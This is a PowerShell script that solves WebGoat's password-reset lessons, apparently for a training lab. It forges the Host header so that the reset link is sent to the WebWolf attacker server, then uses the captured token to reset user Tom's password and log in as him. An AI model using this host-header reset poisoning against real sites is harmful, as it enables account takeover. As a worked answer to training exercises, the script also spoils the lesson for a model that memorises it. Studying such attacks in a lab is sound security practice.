# ============================================================
# WebGoat Password Reset - Complete Attack Script
# ============================================================
# This script performs the complete Host Header Manipulation attack
# to solve BOTH password reset assignments (77 and 79)
# ============================================================

$webGoatUrl = "http://192.168.254.112:8001"
$webWolfUrl = "http://192.168.254.112:8002"
$sessionCookie = "25A6B220A4CB5215EBBE7B31E207B4B1"

Write-Host "=====================================" -ForegroundColor Cyan
Write-Host "WebGoat Password Reset Attack" -ForegroundColor Cyan
Write-Host "=====================================" -ForegroundColor Cyan
Write-Host ""

# ============================================================
# STEP 1: Trigger Password Reset with Malicious Host Header
# ============================================================
Write-Host "[STEP 1] Sending password reset request for Tom..." -ForegroundColor Yellow
Write-Host "  - Manipulating Host header to point to WebWolf" -ForegroundColor Gray

$resetHeaders = @{
    "Host" = "192.168.254.112:8002"  # WebWolf instead of WebGoat!
    "Content-Type" = "application/x-www-form-urlencoded"
    "Cookie" = "JSESSIONID=$sessionCookie"
    "User-Agent" = "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
}

$resetBody = "email=tom@webgoat-cloud.org"

try {
    $response = Invoke-WebRequest `
        -Uri "$webGoatUrl/WebGoat/PasswordReset/ForgotPassword/create-password-reset-link" `
        -Method POST `
        -Headers $resetHeaders `
        -Body $resetBody `
        -UseBasicParsing
    
    $result = $response.Content | ConvertFrom-Json
    
    Write-Host ""
    Write-Host "Server Response:" -ForegroundColor Green
    Write-Host "  Feedback: $($result.feedback)" -ForegroundColor White
    Write-Host "  Lesson Completed: $($result.lessonCompleted)" -ForegroundColor White
    Write-Host "  Assignment: $($result.assignment)" -ForegroundColor White
    
    if ($result.lessonCompleted -eq $true -or $result.feedback -match "success") {
        Write-Host ""
        Write-Host "[SUCCESS] Password reset triggered!" -ForegroundColor Green
        Write-Host "  Assignment 77 may be solved!" -ForegroundColor Green
    } else {
        Write-Host ""
        Write-Host "[INFO] Reset request sent. Check WebWolf for token." -ForegroundColor Yellow
    }
    
} catch {
    Write-Host ""
    Write-Host "[ERROR] Failed to send reset request: $_" -ForegroundColor Red
    exit 1
}

# ============================================================
# STEP 2: Check WebWolf for Captured Reset Link
# ============================================================
Write-Host ""
Write-Host "=====================================" -ForegroundColor Cyan
Write-Host "[STEP 2] Checking WebWolf for token" -ForegroundColor Yellow
Write-Host "=====================================" -ForegroundColor Cyan
Write-Host ""
Write-Host "The password reset email should now be in WebWolf!" -ForegroundColor White
Write-Host ""
Write-Host "Go to: $webWolfUrl/requests" -ForegroundColor Cyan
Write-Host ""
Write-Host "Look for a request containing a reset token URL like:" -ForegroundColor Gray
Write-Host "  /WebGoat/PasswordReset/reset/reset-password/XXXXXXXXXX" -ForegroundColor Gray
Write-Host ""

$token = Read-Host "Enter the reset token you found in WebWolf (or press Enter to skip)"

if ([string]::IsNullOrWhiteSpace($token)) {
    Write-Host ""
    Write-Host "[INFO] No token provided. Manual steps:" -ForegroundColor Yellow
    Write-Host "  1. Check $webWolfUrl/requests for the token" -ForegroundColor White
    Write-Host "  2. Run this script again and provide the token" -ForegroundColor White
    Write-Host "  OR use these manual steps:" -ForegroundColor White
    Write-Host ""
    Write-Host "  # Reset Tom's password:" -ForegroundColor Cyan
    Write-Host "  `$newPassword = 'YourNewPassword123'" -ForegroundColor Cyan
    Write-Host "  `$token = 'PASTE_TOKEN_HERE'" -ForegroundColor Cyan
    Write-Host "  Invoke-WebRequest ``" -ForegroundColor Cyan
    Write-Host "    -Uri '$webGoatUrl/WebGoat/PasswordReset/reset/reset-password/`$token' ``" -ForegroundColor Cyan
    Write-Host "    -Method POST ``" -ForegroundColor Cyan
    Write-Host "    -Headers @{'Content-Type'='application/x-www-form-urlencoded'; 'Cookie'='JSESSIONID=$sessionCookie'} ``" -ForegroundColor Cyan
    Write-Host "    -Body `"password=`$newPassword`"" -ForegroundColor Cyan
    Write-Host ""
    Write-Host "  # Login as Tom:" -ForegroundColor Cyan
    Write-Host "  Invoke-WebRequest ``" -ForegroundColor Cyan
    Write-Host "    -Uri '$webGoatUrl/WebGoat/PasswordReset/reset/login' ``" -ForegroundColor Cyan
    Write-Host "    -Method POST ``" -ForegroundColor Cyan
    Write-Host "    -Headers @{'Content-Type'='application/x-www-form-urlencoded'; 'Cookie'='JSESSIONID=$sessionCookie'} ``" -ForegroundColor Cyan
    Write-Host "    -Body `"email=tom@webgoat-cloud.org&password=`$newPassword`"" -ForegroundColor Cyan
    Write-Host ""
    exit 0
}

# ============================================================
# STEP 3: Reset Tom's Password
# ============================================================
Write-Host ""
Write-Host "=====================================" -ForegroundColor Cyan
Write-Host "[STEP 3] Resetting Tom's password" -ForegroundColor Yellow
Write-Host "=====================================" -ForegroundColor Cyan

$newPassword = "Hacked123!"
Write-Host ""
Write-Host "New password will be: $newPassword" -ForegroundColor White

$resetPasswordHeaders = @{
    "Content-Type" = "application/x-www-form-urlencoded"
    "Cookie" = "JSESSIONID=$sessionCookie"
}

$resetPasswordBody = "password=$newPassword"

try {
    $response = Invoke-WebRequest `
        -Uri "$webGoatUrl/WebGoat/PasswordReset/reset/reset-password/$token" `
        -Method POST `
        -Headers $resetPasswordHeaders `
        -Body $resetPasswordBody `
        -UseBasicParsing
    
    $result = $response.Content | ConvertFrom-Json
    
    Write-Host ""
    Write-Host "Server Response:" -ForegroundColor Green
    Write-Host "  Feedback: $($result.feedback)" -ForegroundColor White
    Write-Host "  Lesson Completed: $($result.lessonCompleted)" -ForegroundColor White
    
    if ($result.feedback -match "success" -or $result.feedback -notmatch "invalid") {
        Write-Host ""
        Write-Host "[SUCCESS] Password reset successful!" -ForegroundColor Green
    } else {
        Write-Host ""
        Write-Host "[WARNING] Password reset may have failed" -ForegroundColor Yellow
        Write-Host "Feedback: $($result.feedback)" -ForegroundColor Gray
    }
    
} catch {
    Write-Host ""
    Write-Host "[ERROR] Failed to reset password: $_" -ForegroundColor Red
    Write-Host "Token may be invalid or expired" -ForegroundColor Gray
    exit 1
}

# ============================================================
# STEP 4: Login as Tom
# ============================================================
Write-Host ""
Write-Host "=====================================" -ForegroundColor Cyan
Write-Host "[STEP 4] Logging in as Tom" -ForegroundColor Yellow
Write-Host "=====================================" -ForegroundColor Cyan

$loginHeaders = @{
    "Content-Type" = "application/x-www-form-urlencoded"
    "Cookie" = "JSESSIONID=$sessionCookie"
}

$loginBody = "email=tom@webgoat-cloud.org&password=$newPassword"

try {
    $response = Invoke-WebRequest `
        -Uri "$webGoatUrl/WebGoat/PasswordReset/reset/login" `
        -Method POST `
        -Headers $loginHeaders `
        -Body $loginBody `
        -UseBasicParsing
    
    $result = $response.Content | ConvertFrom-Json
    
    Write-Host ""
    Write-Host "Server Response:" -ForegroundColor Green
    Write-Host "  Feedback: $($result.feedback)" -ForegroundColor White
    Write-Host "  Lesson Completed: $($result.lessonCompleted)" -ForegroundColor White
    Write-Host "  Assignment: $($result.assignment)" -ForegroundColor White
    
    if ($result.lessonCompleted -eq $true -or $result.feedback -match "success") {
        Write-Host ""
        Write-Host "================================================" -ForegroundColor Green
        Write-Host "SUCCESS! Both challenges completed!" -ForegroundColor Green
        Write-Host "================================================" -ForegroundColor Green
        Write-Host "  Assignment 77: Host Header Manipulation - SOLVED" -ForegroundColor Green
        Write-Host "  Assignment 79: Login as Tom - SOLVED" -ForegroundColor Green
    } else {
        Write-Host ""
        Write-Host "[WARNING] Login may have failed" -ForegroundColor Yellow
        Write-Host "Feedback: $($result.feedback)" -ForegroundColor Gray
        Write-Host ""
        Write-Host "Try logging in manually with:" -ForegroundColor White
        Write-Host "  Email: tom@webgoat-cloud.org" -ForegroundColor Cyan
        Write-Host "  Password: $newPassword" -ForegroundColor Cyan
    }
    
} catch {
    Write-Host ""
    Write-Host "[ERROR] Failed to login: $_" -ForegroundColor Red
}

Write-Host ""
Write-Host "=====================================" -ForegroundColor Cyan
Write-Host "Attack Complete!" -ForegroundColor Cyan
Write-Host "=====================================" -ForegroundColor Cyan
